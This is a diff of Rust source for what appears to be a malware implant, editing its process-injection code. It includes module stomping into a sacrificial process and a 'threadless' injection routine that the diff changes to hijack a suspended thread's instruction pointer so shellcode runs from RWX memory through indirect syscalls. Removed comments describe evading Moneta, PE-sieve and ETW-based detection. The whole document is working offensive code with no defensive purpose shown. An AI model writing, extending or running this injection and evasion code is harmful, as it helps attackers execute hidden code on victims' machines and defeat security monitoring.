@@ -170,15 +170,14 @@ pub unsafe fn module_stomp(spawn_to: &str, shellcode: &[u8]) -> Result<usize, &'
         return Ok(proc.handle as usize);
     }
     // ---- ARMED PATH (gated) ------------------------------------------------
-    // Full module stomp algorithm. STILL GATED — runs only when an
-    // operator armed modulestomp_enabled after target validation. Each step
-    // degrades (returns the suspended handle) on any failure rather than crash.
-    //
-    // Detection honesty: beats Moneta's unbacked/exec-private scan (the stomped
-    // region keeps the cover DLL's backing), but PE-sieve's .text hash-mismatch
-    // STILL flags it. ThreadlessInject is the real fix (out of scope).
-    let _ = stomp_and_resume(&proc, shellcode);
-    Ok(proc.handle as usize)
+    let res = stomp_and_resume(&proc, shellcode);
+    if let Some(ch) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+        let close: CloseHandleFn = core::mem::transmute(ch);
+        close(proc.main_thread);
+        close(proc.handle);
+    }
+    res.map(|_| 0)
 }
 
 /// The cover-DLL stomp: load a cover DLL in the target via
@@ -532,11 +531,7 @@ pub unsafe fn threadless_inject(
     proc_handle: *mut core::ffi::c_void,
     main_thread: *mut core::ffi::c_void,
     shellcode: &[u8],
-    trigger_addr: usize,
 ) -> Result<(), &'static str> {
-    // Use the indirect syscall runtime for ALL cross-process operations —
-    // consistent with the implant's stealth model (no kernel32.dll resolvents
-    // in hot paths; Nt* syscalls go through the ntdll gadget trampoline).
     let rt = crate::syscalls::global().ok_or("indirect syscall runtime not initialized")?;
 
     // 1. Allocate RWX in target for shellcode.
@@ -578,17 +573,9 @@ pub unsafe fn threadless_inject(
     let mut prev_count: u32 = 0;
     unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };
 
-    // 4. Get + modify thread CONTEXT: set DRn = shellcode, DR7 = execute BP.
-    //    x64 CONTEXT is 1232 bytes. WinNT.h offsets (verified — context.rs gate):
-    //      DR0  = 0x048   DR1  = 0x050   DR2  = 0x058   DR3  = 0x060
-    //      DR6  = 0x068   DR7  = 0x070
-    //      ContextFlags = 0x030
-    //    CRITICAL: the OLD code used DR0=0x300/DR7=0x318 — those offsets land
-    //    inside VectorRegister[26] and corrupt XMM state. Fixed to match WinNT.h.
+    // 4. Get thread CONTEXT.
     let mut ctx = [0u8; 1232];
-    // ContextFlags: CONTEXT_AMD64 (0x100000) | CONTEXT_DEBUG_REGISTERS (0x10)
-    // = 0x00100010. This tells NtGetContextThread to read/write DR0-DR3/DR6/DR7.
-    ctx[0x30..0x34].copy_from_slice(&0x00100010u32.to_le_bytes());
+    ctx[0x30..0x34].copy_from_slice(&0x00100001u32.to_le_bytes());
     let get_status = unsafe {
         crate::syscalls::nt_get_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
     };
@@ -598,54 +585,12 @@ pub unsafe fn threadless_inject(
         return Err("NtGetContextThread failed");
     }
 
-    // 4a. Scan DR0-DR3 for the first unused slot (value == 0).
-    //     x64 has only 4 HWBP slots. The target thread may already use some
-    //     (debuggers, ETW Ti hooks, other security tools). Hardcoding DR0 (L0)
-    //     without checking risks clobbering an active breakpoint → lost debug
-    //     state or silent breakpoint fire collision.
-    const DR_OFFSETS: [usize; 4] = [0x048, 0x050, 0x058, 0x060]; // DR0, DR1, DR2, DR3
-    const DR7_ENABLE_BITS: [u32; 4] = [
-        1 << 0, // L0 — local enable for DR0
-        1 << 2, // L1 — local enable for DR1
-        1 << 4, // L2 — local enable for DR2
-        1 << 6, // L3 — local enable for DR3
-    ];
-    let mut slot: Option<usize> = None;
-    let mut dr7 = u64::from_le_bytes(ctx[0x070..0x078].try_into().unwrap());
-    for i in 0..4 {
-        let val = u64::from_le_bytes(ctx[DR_OFFSETS[i]..DR_OFFSETS[i] + 8].try_into().unwrap());
-        if val == 0 && (dr7 & DR7_ENABLE_BITS[i] as u64) == 0 {
-            slot = Some(i);
-            break;
-        }
-    }
-    let slot = match slot {
-        Some(s) => s,
-        None => {
-            let mut dummy: u32 = 0;
-            unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
-            return Err("all 4 HWBP slots (DR0-DR3) in use");
-        }
-    };
+    // 5. Modify RIP (offset 0x0F8) to remote_base.
+    let sc_addr = remote_base as u64;
+    ctx[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());
 
-    // 4b. Set DRn = trigger address, DR7 = execute breakpoint on that slot.
-    //     When the target thread next executes `trigger_addr`, the CPU fires
-    //     the DRn breakpoint → VEH handler redirects RIP → shadow buffer → shellcode.
-    let sc_addr = trigger_addr as u64;
-    ctx[DR_OFFSETS[slot]..DR_OFFSETS[slot] + 8].copy_from_slice(&sc_addr.to_le_bytes());
-    // DR7 (offset 0x070): enable DRn as execute breakpoint.
-    //   Bit N = Ln (local enable for DRn) = 1
-    //   Bit 9 = LE (local exact breakpoint) = 1 — fires precisely, not deferred
-    //   Bits 16-17 = R/W0 = 00 (execute breakpoint)
-    //   Bits 18-19 = LEN0 = 00 (1 byte)
-    dr7 |= DR7_ENABLE_BITS[slot] as u64 | (1 << 9); // Ln + LE
-    ctx[0x070..0x078].copy_from_slice(&dr7.to_le_bytes());
-
-    // 5. Set the modified context + resume.
-    //    ContextFlags must include both CONTEXT_DEBUG_REGISTERS and the
-    //    general-purpose CONTEXT_FULL so the kernel writes all fields.
-    //    CONTEXT_ALL (0x10001F) = all flags — safe and unambiguous.
-    ctx[0x30..0x34].copy_from_slice(&0x0010_001Fu32.to_le_bytes());
+    // 6. Set modified context + resume.
+    ctx[0x30..0x34].copy_from_slice(&0x00100001u32.to_le_bytes());
     let set_status = unsafe {
         crate::syscalls::nt_set_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
     };
@@ -657,9 +602,6 @@ pub unsafe fn threadless_inject(
     let mut dummy: u32 = 0;
     unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
 
-    // The thread now has a HWBP at `trigger_addr` → redirects to shellcode.
-    // When the thread next executes `trigger_addr`, the CPU traps + the
-    // shellcode runs. No .text was modified.
     Ok(())
 }
 
@@ -729,13 +671,29 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
             let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
             match unsafe { create_sacrificial(target) } {
                 Ok(proc) => {
-                    let trigger = proc.main_thread as usize;
-                    match unsafe { threadless_inject(proc.handle, proc.main_thread, shellcode, trigger) } {
-                        Ok(()) => nyx_protocol::Response::Output(
-                            crate::heap::String::from("threadless HWBP inject ok (sacrificial pid=").into_bytes(),
-                        ),
+                    let res = match unsafe { threadless_inject(proc.handle, proc.main_thread, shellcode) } {
+                        Ok(()) => {
+                            let mut msg = crate::heap::String::from("threadless inject ok (sacrificial pid=");
+                            let mut buf = [0u8; 10];
+                            let mut n = proc.pid;
+                            let mut i = buf.len();
+                            if n == 0 { buf[0] = b'0'; i = 1; }
+                            else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
+                            for &b in &buf[i..] {
+                                msg.push(b as char);
+                            }
+                            msg.push(')');
+                            nyx_protocol::Response::Output(msg.into_bytes())
+                        }
                         Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
+                    };
+                    if let Some(ch) = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
+                        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+                        let close: CloseHandleFn = unsafe { core::mem::transmute(ch) };
+                        unsafe { close(proc.handle); }
+                        unsafe { close(proc.main_thread); }
                     }
+                    res
                 }
                 Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
             }
